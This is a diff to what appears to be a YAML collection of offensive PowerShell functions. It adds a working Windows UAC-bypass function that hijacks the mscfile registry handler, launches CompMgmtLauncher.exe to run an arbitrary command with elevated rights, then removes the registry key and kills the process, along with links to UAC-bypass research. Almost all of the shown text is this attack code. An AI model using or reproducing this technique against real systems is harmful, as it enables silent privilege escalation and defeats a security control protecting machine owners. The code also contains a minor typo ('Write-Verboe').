@@ -40,8 +40,69 @@ functions:
             [CMSTPBypass]::Execute($Command)
         }
 
+          function CompMgmtLauncherUACBypass {
+
+
+              [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
+              Param (
+                  [Parameter(Mandatory = $True)]
+                  [ValidateNotNullOrEmpty()]
+                  [String]
+                  $command,
+
+                  [Switch]
+                  $Force
+              )
+
+              $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
+              #Add in the new registry entries to hijack the msc file
+              if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
+                  New-Item $mscCommandPath -Force |
+                      New-ItemProperty -Name '(Default)' -Value $command -PropertyType string -Force | Out-Null
+              }else{
+                  Write-Verbose "Key already exists, consider using -Force"
+                  exit
+              }
+
+              if (Test-Path $mscCommandPath) {
+                  Write-Verbose "Created registry entries to hijack the msc extension"
+              }else{
+                  Write-Warning "Failed to create registry key, exiting"
+                  exit
+              }
+              
+
+              $CompMgmtLauncherPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'CompMgmtLauncher.exe'
+
+              #Start Event Viewer
+              if ($PSCmdlet.ShouldProcess($CompMgmtLauncherPath, 'Start process')) {
+                  $Process = Start-Process -FilePath $CompMgmtLauncherPath -PassThru
+                  Write-Verbose "Started CompMgmtLauncher.exe"
+              }
+
+              #Sleep 5 seconds 
+              Write-Verbose "Sleeping 5 seconds to trigger payload"
+              if (-not $PSBoundParameters['WhatIf']) {
+                  Start-Sleep -Seconds 5
+              }
+
+              $mscfilePath = "HKCU:\Software\Classes\mscfile"
+
+              if (Test-Path $mscfilePath) {
+                  #Remove the registry entry
+                  Remove-Item $mscfilePath -Recurse -Force
+                  Write-Verbose "Removed registry entries"
+              }
+
+              if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
+                  Stop-Process -Id $Process.Id
+                  Write-Verboe "Killed running CompMgmtLauncher process"
+              }
+          }
+
 resources : |
   https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
   https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
+  http://www.fuzzysecurity.com/tutorials/27.html
 ---
 
